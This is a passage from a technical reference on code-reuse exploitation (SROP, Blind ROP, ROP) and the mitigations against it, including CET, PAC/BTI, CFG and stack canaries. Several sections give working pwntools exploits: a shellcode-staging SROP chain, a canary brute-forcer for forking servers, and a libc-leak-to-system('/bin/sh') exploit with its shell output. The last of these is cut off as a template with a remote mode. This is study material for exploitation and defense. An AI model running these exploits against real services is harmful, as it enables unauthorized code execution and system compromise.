# Assume we have leaked or know the address of a syscall;ret gadget
# and the address of a writable region (e.g., BSS or known mmap region).
SYSCALL_RET = 0x401032          # address of "syscall; ret" in binary
WRITABLE    = 0x601000          # .bss or known writable page
SHELLCODE   = asm(shellcraft.sh())

# --- Stage 1: sigreturn -> mprotect(WRITABLE, 0x1000, 7) ---
frame1 = SigreturnFrame()
frame1.rax = constants.SYS_mprotect    # 10
frame1.rdi = WRITABLE                  # addr (page-aligned)
frame1.rsi = 0x1000                    # length
frame1.rdx = 7                         # PROT_READ|PROT_WRITE|PROT_EXEC
frame1.rip = SYSCALL_RET               # after mprotect, execute syscall;ret
frame1.rsp = WRITABLE + 0x500          # pivot stack for stage 2

# Stage 2 frame will be placed at WRITABLE+0x500.
# After mprotect returns, rsp points to WRITABLE+0x500, and the
# "ret" in syscall;ret pops the next address from this new stack.

# --- Stage 2: sigreturn -> read(0, WRITABLE, len(SHELLCODE)) ---
frame2 = SigreturnFrame()
frame2.rax = constants.SYS_read        # 0
frame2.rdi = 0                         # fd = stdin
frame2.rsi = WRITABLE                  # buffer
frame2.rdx = len(SHELLCODE) + 0x10     # count
frame2.rip = WRITABLE                  # after read, jump to shellcode

# Build the initial payload (goes on the original stack)
# Layout: padding | pop_rax_15 | SYS_rt_sigreturn | SYSCALL_RET | frame1
POP_RAX_RET = 0x401020  # "pop rax; ret" gadget
payload  = b"A" * 72                           # overflow padding
payload += p64(POP_RAX_RET)                    # set rax = 15
payload += p64(constants.SYS_rt_sigreturn)     # 15
payload += p64(SYSCALL_RET)                    # trigger sigreturn
payload += bytes(frame1)                       # fake signal frame

p.sendlineafter(b"> ", payload)

# Stage 2: send the second sigreturn frame to the pivoted stack,
# then send shellcode.
# At WRITABLE+0x500, we need: POP_RAX | 15 | SYSCALL_RET | frame2
stage2  = p64(POP_RAX_RET)
stage2 += p64(constants.SYS_rt_sigreturn)
stage2 += p64(SYSCALL_RET)
stage2 += bytes(frame2)

# The read from stage 1 writes to WRITABLE, but we positioned rsp
# at WRITABLE+0x500, so we send padding then stage2, then shellcode.
# (Exact layout depends on the read target and stack pivot offset.)
p.send(SHELLCODE.ljust(0x500, b"\x90") + stage2)

p.interactive()
```

The power of SROP is that the entire register state — all GPRs, `rip`, `rsp`, flags — is set from pure data on the stack. The attacker needs only one gadget (`syscall; ret`) and the ability to place data on the stack. Everything else is accomplished through the `sigreturn` mechanism that the kernel provides.

### 7.7 Kernel SROP variants

SROP concepts apply to kernel exploitation as well, though the mechanism differs. In kernel space, `rt_sigreturn` is a user-mode syscall and cannot be directly invoked from kernel context. However, the kernel's signal delivery path (`setup_rt_frame` / `restore_sigcontext`) manipulates the same signal frame structures, and bugs in signal handling code can allow similar register-state injection.

CVE-2014-9322 exploited a flaw in the x86_64 kernel's handling of the `IRET` instruction during return from espfix64, allowing a crafted user-mode stack to inject arbitrary register values into the kernel's register restore path — functionally equivalent to SROP at the kernel level. The fix required careful validation of the stack segment during `IRET`.

More broadly, any kernel mechanism that restores register state from user-controllable memory (context switch structures, exception frames, virtual machine exit state) is an SROP-analog attack surface in kernel space.

---

## 8. Blind ROP (BROP)

### 8.1 Concept

BROP, introduced by Bittau et al. (2014), is a technique for constructing a ROP exploit against a remote service without having the binary or any prior knowledge of its memory layout. It applies specifically to services with **fork-based concurrency** where each connection is handled by a `fork`'d child process.

The key property: `fork` preserves the parent's address space exactly — same code, same data, same ASLR layout, same stack canaries. If the child crashes, the parent is unaffected and will `fork` a new child with the same layout. This gives the attacker an oracle: they can repeatedly try payloads and observe whether the connection crashes or not.

### 8.2 Attack phases

**Phase 1: Stack canary brute-force.** The attacker overflows a buffer, overwriting the canary byte-by-byte. For each byte position, they try all 256 values. If the connection crashes (canary mismatch → `__stack_chk_fail` → `SIGABRT`), the byte was wrong; if the connection stays alive or produces a normal response, the byte was correct. After at most 8 × 256 = 2048 attempts, the entire 8-byte canary is known. (The first byte is typically `\x00` to prevent string functions from leaking it, reducing this to 7 × 256 + 1 = 1793 attempts.)

**Phase 2: Return address discovery.** With the canary known, the attacker overflows past it and tries return addresses. A valid return address that causes the child to execute a `ret` into existing code produces a different behavior (maybe a normal response, maybe a different crash signature) than a `SIGSEGV`. By scanning through the address space, the attacker locates the approximate range of executable code.

**Phase 3: Gadget discovery.** The attacker probes specific addresses looking for known gadget patterns. The key signature is a `stop gadget` — an address that, when returned to, causes the connection to hang or produce a recognizable response rather than crashing. Using a stop gadget as a canary, the attacker can test whether candidate gadgets perform expected operations (e.g., does address X pop one value from the stack before the stop gadget runs? If so, it's a `pop rXX; ret` gadget).

**Phase 4: `write` gadget and binary exfiltration.** Once enough gadgets are identified (particularly `pop rdi; ret`, `pop rsi; ret`, `pop rdx; ret`), the attacker constructs a ROP chain that calls `write(socket_fd, code_address, length)` to send the binary's code back over the network. With the binary in hand, full gadget discovery proceeds offline, and a complete exploit is constructed.

### 8.3 Requirements

BROP requires a service that forks without calling `execve` for each connection (so the address space is stable across attempts), a remotely-triggerable stack buffer overflow, and the ability to observe crash vs no-crash. Services that `execve` a new binary per connection (re-randomizing ASLR) are immune. Services behind a crash-restart supervisor that re-execs (like systemd's `Restart=always` with a new process) are also immune.

### 8.4 Detection

BROP generates a distinctive pattern: many connections to the service, each with slightly different overflow payloads, with a high crash rate. Monitoring for rapid consecutive crashes of child processes (via audit logs, core-dump frequency, or process-exit monitoring) is the primary detection mechanism. Rate-limiting connections and implementing crash-triggered re-exec (instead of fork-only) are effective mitigations.

### 8.5 BROP canary brute-force implementation

The following Python implementation demonstrates the byte-by-byte canary brute-force against a forking network service. This is Phase 1 of the BROP attack.

```python
#!/usr/bin/env python3
"""BROP Phase 1: byte-by-byte canary brute-force against a forking server."""
import socket
import sys

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 9999
OVERFLOW_LEN = 64       # bytes to reach the canary
CANARY_LEN   = 8        # 8 bytes on x86_64
TIMEOUT      = 2

def try_byte(known_canary: bytes, guess: int) -> bool:
    """Send overflow + known canary bytes + guess byte.
    Returns True if the service does NOT crash (byte is correct)."""
    payload = b"A" * OVERFLOW_LEN + known_canary + bytes([guess])
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((TARGET_HOST, TARGET_PORT))
        s.recv(1024)                       # consume banner/prompt
        s.send(payload + b"\n")
        response = s.recv(1024)            # if we get a response, no crash
        s.close()
        return len(response) > 0
    except (socket.timeout, ConnectionResetError, BrokenPipeError):
        return False                       # crash → wrong byte

def brute_force_canary() -> bytes:
    """Recover the full canary byte by byte."""
    canary = b""
    for position in range(CANARY_LEN):
        for guess in range(256):
            if try_byte(canary, guess):
                canary += bytes([guess])
                print(f"[+] Canary byte {position}: 0x{guess:02x}  "
                      f"(canary so far: {canary.hex()})")
                break
        else:
            print(f"[-] Failed to find byte at position {position}")
            sys.exit(1)
    return canary

if __name__ == "__main__":
    canary = brute_force_canary()
    print(f"[+] Full canary: 0x{canary.hex()}")
    # Phase 2: continue to brute-force the return address...
```

The first canary byte is typically `\x00` (the NUL terminator defense), so the attacker can skip the first byte if they know this convention, reducing the search to 7 x 256 = 1792 attempts.

### 8.6 PLT/GOT probing and binary reconstruction

After recovering the canary and a valid return address range (Phase 2), the attacker locates PLT entries by probing candidate addresses. The PLT has a distinctive structure: each entry is a `jmp` through the GOT, followed by a `push` of the relocation index and a `jmp` to the PLT resolver. The attacker identifies PLT entries by their behavior when called with specific arguments.

The critical target is the `write` PLT entry (or `send` for socket-based services). The attacker tests candidate addresses by constructing minimal ROP chains that call the candidate with `(socket_fd, probe_address, length)`. If the candidate is indeed `write@PLT`, the service sends data back to the attacker over the socket. If the candidate is a different function or an invalid address, the child crashes silently.

Once `write@PLT` is located, the attacker uses it to exfiltrate the binary's `.text` section over the socket, byte by byte or in chunks. With the full binary in hand, offline gadget analysis produces a complete ROP chain, and the attacker sends the final exploit payload.

The complete BROP attack typically requires 2000-5000 connection attempts (canary brute-force + address probing + PLT identification), all of which generate child-process crashes. This volume of crashes within a short window is the primary detection surface.

---

## 9. Complete exploitation walkthrough

This section presents an end-to-end exploitation of a vulnerable binary, from initial analysis through shell acquisition, using the techniques described in §2-§8. The target is a simple stack-overflow vulnerable service compiled with partial mitigations.

### 9.1 Target analysis

```bash
$ checksec --file=./target_service
[*] '/home/user/target_service'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

The binary has NX (W^X) enabled but no stack canary, no PIE (fixed base address), and only partial RELRO (writable GOT). This means the attacker can use ROP (NX prevents shellcode injection) and knows all code addresses in the binary without a leak (no PIE). The writable GOT provides an alternative attack surface for GOT overwrite, but the ROP approach is more general.

### 9.2 Vulnerability identification

GDB analysis reveals a `read(0, buf, 0x200)` call where `buf` is a 64-byte stack buffer. The function has no canary check, and the 512-byte read easily overflows the 64-byte buffer, overwriting the saved `rbp` and return address.

```
$ gdb -q ./target_service
gef> disas vuln_function
   0x401156 <+0>:  push rbp
   0x401157 <+1>:  mov  rbp, rsp
   0x40115a <+4>:  sub  rsp, 0x40          ; 64-byte buffer
   0x40115e <+8>:  lea  rax, [rbp-0x40]
   0x401162 <+12>: mov  edx, 0x200         ; read up to 512 bytes
   0x401167 <+17>: mov  rsi, rax
   0x40116a <+20>: mov  edi, 0x0           ; fd = stdin
   0x40116f <+25>: call 0x401040 <read@plt>
   0x401174 <+30>: leave
   0x401175 <+31>: ret
```

The overflow offset is 64 bytes (buffer) + 8 bytes (saved `rbp`) = 72 bytes to reach the saved return address.

### 9.3 Gadget discovery

```bash
$ ROPgadget --binary ./target_service --only "pop|ret"
...
0x00000000004011d3 : pop rdi ; ret
0x00000000004011d1 : pop rsi ; pop r15 ; ret
0x0000000000401016 : ret
...

$ ROPgadget --binary ./target_service --only "syscall"
# (none in the binary — need libc)
```

The binary itself has `pop rdi; ret` and `pop rsi; pop r15; ret` gadgets (from `__libc_csu_init`), plus `puts@PLT` for leaking and `main` for looping. Since there is no `syscall` gadget in the binary, the attacker must leak libc and use libc's gadgets.

### 9.4 Exploit construction

```python
#!/usr/bin/env python3
"""Complete ROP exploit: leak libc, call system('/bin/sh')."""
from pwn import *

context.binary = elf = ELF("./target_service")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

p = process("./target_service")

# Gadgets from the binary (no PIE, addresses are fixed)
POP_RDI   = 0x4011d3
RET       = 0x401016

# --- Stage 1: Leak puts@libc ---
log.info("Stage 1: leaking libc address via puts@GOT")
payload  = b"A" * 72
payload += p64(POP_RDI)
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(elf.symbols["main"])     # loop back for stage 2

p.sendafter(b"Input: ", payload)

leaked_puts = u64(p.recvline().strip().ljust(8, b"\x00"))
libc.address = leaked_puts - libc.symbols["puts"]
log.success(f"libc base: {hex(libc.address)}")

# --- Stage 2: system("/bin/sh") ---
log.info("Stage 2: calling system('/bin/sh')")
bin_sh = next(libc.search(b"/bin/sh\x00"))

payload2  = b"A" * 72
payload2 += p64(RET)                    # stack alignment
payload2 += p64(POP_RDI)
payload2 += p64(bin_sh)
payload2 += p64(libc.symbols["system"])

p.sendafter(b"Input: ", payload2)

log.success("Shell obtained")
p.interactive()
```

### 9.5 Execution and verification

```
$ python3 exploit.py
[*] '/home/user/target_service'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Stage 1: leaking libc address via puts@GOT
[+] libc base: 0x7f8a3c200000
[*] Stage 2: calling system('/bin/sh')
[+] Shell obtained
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ whoami
user
```

The two-stage approach is the standard pattern for modern ROP exploitation: use the binary's own PLT to leak a runtime address, compute the libc base, then use libc's rich function set to achieve the final objective. Against a binary with stack canaries, the attacker would need an additional leak or the fork-based brute-force technique from §8.5. Against PIE, the attacker needs an info leak for the binary base before even constructing the first stage.

---

## 10. Defenses: Intel CET

### 9.1 Indirect Branch Tracking (IBT)

CET IBT adds a hardware-enforced forward-edge CFI mechanism. When IBT is enabled:

Every indirect branch (`jmp reg`, `call reg`, `jmp [mem]`, `call [mem]`) must land on an `ENDBR64` instruction (or `ENDBR32` in 32-bit mode). If the target instruction is not `ENDBR64`, the CPU raises a `#CP` (Control Protection) exception.

`ENDBR64` is a 4-byte NOP on CPUs without CET support (opcode `F3 0F 1E FA`), so CET-compiled binaries run correctly on older hardware. On CET-enabled hardware, `ENDBR64` clears an internal "tracker" state that was set by the preceding indirect branch; if the tracker is set and the next instruction is not `ENDBR64`, the `#CP` fires.

Impact on gadgets: the vast majority of ROP/JOP/COP gadgets begin at arbitrary instruction boundaries that are not function entries — they do not start with `ENDBR64`. IBT makes these gadgets unusable as indirect-branch targets. The remaining valid targets are function entry points (which the compiler marks with `ENDBR64`) and a small number of other landing pads. This dramatically reduces the gadget space, though it does not eliminate code reuse entirely — BOP-style attacks using valid function entries remain theoretically possible.

IBT is enabled per-process: the dynamic linker checks all loaded objects' `PT_GNU_PROPERTY` for `GNU_PROPERTY_X86_FEATURE_1_IBT` (Domain 1, Chapter 1B §5.3) and enables IBT only if all objects declare support. A single legacy library disables IBT process-wide.

### 9.2 Shadow Stack (SHSTK)

CET Shadow Stack adds hardware-enforced backward-edge CFI. A separate, hardware-managed stack (the shadow stack) stores return addresses. On every `call`, the CPU pushes the return address onto both the normal stack and the shadow stack. On every `ret`, the CPU pops from both stacks and compares: if they differ, a `#CP` exception fires.

The shadow stack is a special memory region with a dedicated page-table type (`_PAGE_DIRTY` set + `_PAGE_RW` clear on x86, creating a shadow-stack-specific permission that cannot be created by normal `mmap`). It cannot be written to by ordinary `mov` instructions — only `call` and the dedicated shadow-stack manipulation instructions (`RSTORSSP`, `SAVEPREVSSP`, `WRSS` with `CR4.CET`-controlled access) can modify it.

Impact on ROP: ROP chains overwrite return addresses on the normal stack, but the shadow stack retains the legitimate return addresses. Every `ret` in the ROP chain triggers a shadow-stack mismatch and a `#CP`. ROP is architecturally dead on systems with full shadow stack enforcement.

Impact on SROP: `sigreturn` must update the shadow stack to reflect the "restored" return address. The kernel's signal delivery and sigreturn paths are CET-aware: on signal delivery, the kernel pushes a token onto the shadow stack; on `sigreturn`, it verifies and pops the token. A forged `sigframe` without a matching shadow-stack token causes `sigreturn` to fail.

### 9.3 Deployment status

CET is supported on Intel CPUs from 12th-gen Alder Lake onward (SHSTK) and 11th-gen Tiger Lake (IBT). Linux kernel support is available since 5.18 (user-space shadow stacks) and 6.6 (kernel IBT). glibc 2.39+ supports CET shadow stacks. Windows 11 enables shadow stacks ("Hardware-enforced Stack Protection") for compatible applications.

The deployment challenge is the all-or-nothing property of IBT and the JIT-compatibility challenge of shadow stacks (JIT compilers that generate code without `ENDBR` or that manipulate the stack in non-standard ways need updating).

---

## 10. AMD Shadow Stack

AMD implements CET-compatible shadow stacks (the same `#CP` exception, the same shadow-stack page-table encoding, the same `RSTORSSP`/`SAVEPREVSSP` instructions) on Zen 3+ CPUs. The IBT equivalent on AMD is not identically named but follows the same `ENDBR64` mechanism via the CET specification. AMD's implementation is compatible with the same Linux kernel and Windows support as Intel CET.

---

## 11. ARM Pointer Authentication (PAC) and Branch Target Identification (BTI)

### 11.1 PAC

ARMv8.3-A introduces Pointer Authentication: instructions that compute a cryptographic MAC (the "PAC") over a pointer value and a modifier (typically the stack pointer or a context value), storing the MAC in the unused upper bits of the pointer (enabled by TBI — see Domain 2, Chapter 2A §1.2).

The key instructions:

`PACIA` / `PACIASP`: compute PAC using instruction key A and the stack pointer as modifier, sign the LR (link register, the return address on AArch64). Placed in function prologues.

`AUTIA` / `AUTIASP`: verify and strip the PAC from LR. Placed before `ret`. If the PAC doesn't match (the pointer was tampered with), the upper bits are corrupted, and the subsequent `ret` jumps to an invalid address → `SIGBUS`/`SIGSEGV`.

`PACIB` / `PACIBSP`: same with key B (allows two independent signing schemes).

`RETAA` / `RETAB`: combined authenticate-and-return (atomic `AUTIASP; ret`), closing the window between authentication and use.

`BRAA` / `BRAB`: authenticated branch (authenticate a pointer and branch to it).

Impact: PAC protects backward-edge (return addresses) and forward-edge (function pointers, if signed) control flow. An attacker who corrupts a return address must forge a valid PAC, which requires knowing the key (stored in system registers, inaccessible from user mode) and the modifier. Brute-forcing a PAC is infeasible for keys of sufficient width (the PAC is typically 7–16 bits depending on virtual-address size, but attacks with bit-flipping have been demonstrated on older implementations — PACMAN attack on M1). Newer implementations (ARMv8.6-A with FEAT_FPAC) raise a fault immediately on PAC mismatch rather than corrupting the pointer, closing the PACMAN-style oracle.

### 11.2 BTI

ARMv8.5-A adds Branch Target Identification: indirect branches must land on a `BTI` instruction (analogous to Intel's `ENDBR64`). If an indirect branch lands elsewhere, the CPU raises a fault. BTI is enabled per-page (the `GP` bit in the page table entry), so a single non-BTI library doesn't necessarily disable BTI for the entire process (unlike Intel IBT).

Combined, PAC + BTI provide both backward-edge and forward-edge CFI on AArch64, and are deployed on Apple Silicon (M1+, with PAC mandatory for all code), on Android (PAC enabled in the kernel since Android 12, BTI in the kernel since Android 14), and on server-class ARM platforms.

---

## 12. Microsoft CFG and XFG

### 12.1 Control Flow Guard (CFG)

CFG is Microsoft's forward-edge CFI for Windows binaries. At compile time, MSVC records the set of all functions whose address is taken (i.e., potential indirect-call targets). This set is stored in the load configuration directory's `GuardCFFunctionTable` (Domain 1, Chapter 2 §11). At load time, the Windows loader rasterizes these addresses into a process-wide bitmap (one bit per 8-byte-aligned address).

Before every indirect `call`, the compiler inserts a call to the CFG check function (`__guard_check_icall_fptr`), which verifies the target address against the bitmap. If the bit is not set, the check function calls `RtlFailFast` (process termination).

CFG is coarse-grained: it allows calling any function whose address is taken anywhere in the process. It does not distinguish which call sites should reach which targets. This means CFG cannot prevent COOP-style attacks or any attack that targets a valid but wrong function.

### 12.2 eXtended Flow Guard (XFG)

XFG improves on CFG by adding type-hash matching. At compile time, each indirect call site and each potential target function are annotated with a hash of the function prototype (argument types and return type). At runtime, the check verifies both that the target is in the bitmap and that the prototype hash at the target matches the expected hash at the call site.

XFG narrows the valid target set per call site from "any address-taken function" to "any address-taken function with a matching prototype." This is significantly tighter and defeats many COOP scenarios (the attacker would need to find a function with both the right prototype and the right behavior).

XFG was introduced in Windows Insider builds and is being rolled out incrementally.

---

## 13. Clang CFI

Clang implements several CFI schemes under `-fsanitize=cfi-*`:

**`cfi-icall`** (forward-edge, C): indirect calls are checked against a per-type function-pointer set. Functions of the same type (same argument and return types) form an equivalence class; an indirect call through a function pointer of type `void (*)(int)` can only reach functions with that exact signature. Implemented via type-test bitsets or jump tables.

**`cfi-vcall`** (forward-edge, C++): virtual calls are checked against the set of valid methods for the class hierarchy at that call site. A call to `Base::foo()` can only reach `Base::foo()`, `Derived1::foo()`, or `Derived2::foo()` — not an unrelated class's method. This is the defense against COOP.

**`cfi-nvcall`** (non-virtual member function calls), **`cfi-derived-cast`** and **`cfi-unrelated-cast`** (dynamic casts): additional type-safety checks.

**`shadow-call-stack`** (backward-edge): a software shadow stack that stores return addresses in a separate memory region (pointed to by a dedicated register, `x18` on AArch64). On function entry, `lr` is stored to `[x18]` and `x18` is incremented; on return, the stored value is loaded and compared. This provides shadow-stack protection on hardware without CET, though it relies on the `x18` register not being corrupted (which requires the attacker to not have an arbitrary-write primitive that can reach the shadow stack).

Clang CFI is used by Android (system libraries are compiled with CFI since Android 9), ChromeOS, and Fuchsia.

---

## 14. grsecurity/PaX RAP

RAP (Reuse Attack Protector) is a grsecurity/PaX CFI implementation that instruments indirect calls and returns with hash-based type checking. Each function is annotated with a type hash derived from its prototype; indirect calls check the hash at the target. Returns are protected with a separate return-address encryption scheme.

RAP is notable for being one of the earliest production-grade CFI systems and for providing both forward-edge and backward-edge protection. It is available only as part of the commercial grsecurity kernel patch set.

---

## 15. Stack canaries

### 15.1 Mechanism

Stack canaries (stack cookies, stack guards) are a compiler-inserted defense against stack buffer overflows. The compiler places a random value (the canary) between local variables and the saved return address in the stack frame. On function exit, the compiler checks the canary against the master copy; if they differ, the overflow is detected and the process is terminated (`__stack_chk_fail`).

### 15.2 Compiler options

**`-fstack-protector`**: instruments only functions with local character arrays (the most common overflow vector). Light overhead, narrow coverage.

**`-fstack-protector-strong`** (GCC 4.9+): instruments functions with local arrays of any type, functions that take addresses of local variables, and functions with stack-allocated structures containing arrays. Broader coverage with still-modest overhead. This is the recommended setting for production builds and the default on many distributions.

**`-fstack-protector-all`**: instruments every function. Higher overhead, maximum coverage. Used in some security-critical builds.

**`-fno-stack-protector`**: disables canaries entirely. Used only for specific low-level code (e.g., kernel entry stubs, boot code) where the canary infrastructure isn't available.

**`__attribute__((no_stack_protector))`**: disables the canary for a specific function. Used in performance-critical inner loops or in code that legitimately modifies its own stack frame. The presence of this attribute in a codebase is worth auditing — it creates an unprotected function that may be exploitable if it has a buffer overflow.

### 15.3 `-fstack-clash-protection`

Not a canary but a related compiler mitigation. When a function allocates a large stack frame (larger than one page), the compiler emits a sequence of page-granular probes (writes to each page between the old and new stack pointer) before using the space. This ensures that every guard page in the path is touched, preventing the stack-clash attack where a large allocation skips over the guard page and lands in an adjacent VMA (Domain 2, Chapter 2A §4).

### 15.4 Canary entropy

On Linux, the canary is derived from `AT_RANDOM` (16 bytes of kernel-supplied randomness, Domain 1, Chapter 1B §10.2). glibc initializes `__stack_chk_guard` from `AT_RANDOM` with a NUL byte in position 0 (to prevent string functions from leaking the canary — `strcpy` stops at the NUL). The remaining 7 bytes provide 56 bits of entropy.

On Windows, `__security_cookie` is initialized by the CRT with a mix of the process ID, thread ID, tick count, and performance counter (Domain 1, Chapter 2 §11). Modern CRT versions use higher-entropy sources.

### 15.5 Canary brute-force in forking servers

In a service that `fork`s for each connection (without `execve`), all children share the parent's canary (because `fork` copies the parent's memory exactly). The attacker can brute-force the canary byte-by-byte:

1. Overflow the buffer to reach the first canary byte. Try all 256 values.
2. If the child crashes (`__stack_chk_fail`), the byte was wrong. If it doesn't crash (or produces a normal response), the byte was correct.
3. Move to the next byte. Repeat.

At most 8 × 256 = 2048 attempts are needed. Since the first byte is known to be `\x00`, only 7 × 256 = 1792 additional attempts are needed.

This is the same property that enables BROP (§8). The mitigation is the same: don't `fork` without `execve` for connection handling (use `exec`-based process models that re-randomize the canary per child), or use a re-keying mechanism that changes the canary in the child after `fork` (not natively supported by glibc but implementable in application code).

Detection: a brute-force attempt produces many child crashes in rapid succession, each with a `SIGABRT` from `__stack_chk_fail`. Monitoring for this pattern (high-frequency `__stack_chk_fail` invocations from the same parent process) is a reliable detection.

---

## 16. The defense stack: layered mitigation

A modern system's anti-code-reuse posture is a stack of layered defenses:

**W^X** (the base): prevents code injection. Forces the attacker to reuse existing code.

**ASLR** (the randomization layer): hides code locations. Forces the attacker to obtain an information leak before constructing a gadget chain.

**Stack canaries** (the corruption detection layer): detects stack overflows. Forces the attacker to either brute-force the canary (possible only in fork-without-exec models), leak the canary (via a separate read primitive), or use a non-stack corruption (heap overflow, use-after-free, format string writing to a non-stack target).

**Full RELRO** (the GOT hardening layer): makes the GOT read-only. Forces the attacker to target other writable code pointers.

**CET Shadow Stack / PAC** (backward-edge CFI): protects return addresses. Defeats ROP and SROP. Forces the attacker to use forward-edge techniques (JOP, COP, COOP).

**CET IBT / PAC BTI / CFG / Clang CFI** (forward-edge CFI): constrains indirect call/jump targets. Defeats JOP and COP. With fine-grained type checking (XFG, Clang cfi-vcall), also defeats COOP.

**Fine-grained CFI + type-based dispatch checking** (the endgame): constrains every indirect control-flow transfer to a type-correct target. Eliminates most practical code reuse.

No single defense is sufficient. Each layer forces the attacker to escalate to a more constrained technique. The defender's goal is to raise the cost of exploitation until it exceeds the attacker's budget — in complexity, in required primitives (needing both a write and a read, or a specific type of object layout), and in reliability (attacks that work only probabilistically are less valuable).

---

## 17A. Gadget finding tools — comparative reference

§2.6 covers ROPgadget, Ropper, rp++, and one_gadget invocations in detail. This section extends that with bad-byte filtering, tools not covered earlier (xrop, angrop), and gadget quality assessment.

### 17A.1 Bad-byte filtering and auto-chain generation

Real exploits frequently cannot contain certain bytes — `\x00` (string terminator), `\x0a` (newline, terminates `gets`/`fgets`), `\x0d` (carriage return). All major gadget tools support exclusion:

```bash
# ROPgadget: exclude NUL and newline bytes, generate execve chain
ROPgadget --binary ./vuln --ropchain --badbytes "000a"

# ROPgadget: restrict to pop/ret gadgets without bad bytes
ROPgadget --binary ./vuln --only "pop|ret" --badbytes "000a0d"

# Ropper: bad-byte filtering + auto-chain
ropper -f ./vuln --chain execve --badbytes 000a

# Ropper: search only gadgets whose addresses contain no bad bytes
ropper -f ./vuln --search "pop rdi" --badbytes 000a0d00
```

Auto-chain generators (`ROPgadget --ropchain`, `ropper --chain execve`) are useful for CTF speed and initial PoC drafting. They fail often against hardened targets (stripped binaries, limited gadget sets, unusual ABI constraints). Manual chain construction — iterating through candidate gadgets, verifying side effects in GDB, adjusting for alignment — remains necessary for production exploits.

### 17A.2 xrop, rp++, and angrop comparison

| Tool | Architecture | Speed on libc-2.38 | Unique strength | Weakness |
|------|--------------|--------------------|-----------------|----------|
| **ROPgadget** | x86, x86_64, ARM, MIPS, PPC | ~12s | Widest arch support, `--ropchain` auto-generation | Slower on very large binaries (>50 MB) |
| **Ropper** | x86, x86_64, ARM, MIPS | ~8s | Interactive mode, semantic search (`--search`), `--chain` for execve/mprotect/virtualprotect | Memory-heavy on huge binaries |
| **rp++** | x86, x86_64, ARM | ~2s | Fastest scanner, C++ native, handles multi-GB kernel images | No auto-chain generation, output requires manual parsing |
| **xrop** | x86, x86_64 | ~5s | Lightweight, single-purpose, clean output format | x86-only, no filtering, no chain generation |
| **angrop** | x86_64 (via angr) | ~45s | Symbolic constraint solving — finds chains that satisfy complex register constraints automatically | Extremely slow (symbolic execution overhead), high memory usage, best for small binaries |

angrop (part of the angr framework) models gadgets as symbolic state transformers and uses constraint solving to compose chains meeting arbitrary register/memory goals. It finds chains manual analysis misses, but is impractical for binaries above ~5 MB.

### 17A.3 Gadget quality metrics

Not all gadgets are equal. A `pop rdi; ret` that also clobbers `rcx` and writes to `[rsp-8]` is less useful than a clean `pop rdi; ret`. Quality assessment:

**Length.** Fewer instructions = fewer side effects. Ideal gadgets are 1-3 instructions before the terminator. Gadgets longer than 5 instructions almost always have unintended effects that complicate chain construction.

**Register clobbering.** A gadget that sets `rdi` but also clobbers `rsi` and `rdx` forces the chain to re-set those registers afterward. Track which registers each gadget reads, writes, and clobbers. Tools like angrop model this explicitly; with ROPgadget/Ropper, manual verification in GDB is necessary.

**Memory side effects.** Gadgets containing `mov [reg], reg` or `push`/`pop` pairs that touch memory may corrupt the chain's data layout. A gadget like `pop rdi; mov [rsp+0x10], rax; ret` writes `rax` to the stack — if that overlaps with a later chain entry, the chain breaks.

**Alignment requirements.** Some libc functions using SSE `movaps` require 16-byte stack alignment. A chain arriving at a `call` with `rsp % 16 != 0` faults. A single `ret` gadget ("ret sled") before the target fixes alignment.

**Stability across builds.** Gadgets at intended instruction boundaries (function prologues, epilogues) are stable across compiler versions and optimization levels. Unintended gadgets (mid-instruction alignments) shift or disappear with minor code changes. Exploits targeting specific software versions can rely on unintended gadgets; exploits that need cross-version reliability should prefer intended-boundary gadgets.

### 17A.4 pwntools ROP class — programmatic gadget finding and chain building

The pwntools `ROP` class wraps gadget discovery and chain construction into a Python API, eliminating manual address lookup:

```python
from pwn import *

elf = ELF("./vuln_binary")
rop = ROP(elf)

# Find specific gadgets by instruction sequence
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# Build a chain manually using raw gadget addresses
rop.raw(pop_rdi)
rop.raw(elf.got['puts'])       # rdi = puts@GOT
rop.call('puts')               # call puts@PLT (resolved by symbol name)
rop.call('main')               # return to main

# Extract the chain as bytes for payload construction
chain_bytes = rop.chain()

# Alternatively, use the high-level call() API which auto-inserts
# pop gadgets for argument setup:
rop2 = ROP(elf)
rop2.call('puts', [elf.got['puts']])  # auto: pop rdi; ret + GOT addr + puts@PLT
rop2.call('main')
chain_bytes_v2 = rop2.chain()

# Print the chain layout for debugging
print(rop2.dump())
# Output:
# 0x0000:       0x4011d3 pop rdi; ret
# 0x0008:       0x404018 got.puts
# 0x0010:       0x401040 puts
# 0x0018:       0x401156 main
```

The `ROP.call()` method automatically selects the appropriate register-setting gadgets for the target ABI (`rdi`, `rsi`, `rdx`, `rcx` on x86_64 SysV). When a needed gadget (`pop rdx; ret`) is absent from the binary, `call()` raises an exception — the attacker must fall back to `ret2csu` (§2.8), load libc gadgets, or use manual `raw()` construction.

---

## 17B. Complete ROP chain exploit — production template

§2.7 and §9.4 demonstrate the two-stage leak-then-exploit pattern. This section provides a hardened template with error handling, local/remote mode switching, and explicit commentary on common failure modes.

```python
#!/usr/bin/env python3
"""
ROP exploit template: NX + ASLR + Partial RELRO target.

Usage:
    python3 exploit.py              # local mode
    python3 exploit.py REMOTE       # remote mode (edit HOST/PORT below)
"""
import sys
from pwn import *

# ── Configuration ──────────────────────────────────────────────
HOST = "target.example.com"
PORT = 1337
BINARY = "./vuln_binary"
LIBC   = "/lib/x86_64-linux-gnu/libc.so.6"

context.binary = elf = ELF(BINARY)
libc = ELF(LIBC)
context.log_level = "info"

def conn():
    if len(sys.argv) > 1 and sys.argv[1].upper() == "REMOTE":
        return remote(HOST, PORT)
    return process(BINARY)

# ── Gadgets (from binary — no PIE, addresses fixed) ───────────
# Verify with: ROPgadget --binary ./vuln_binary --only "pop|ret"
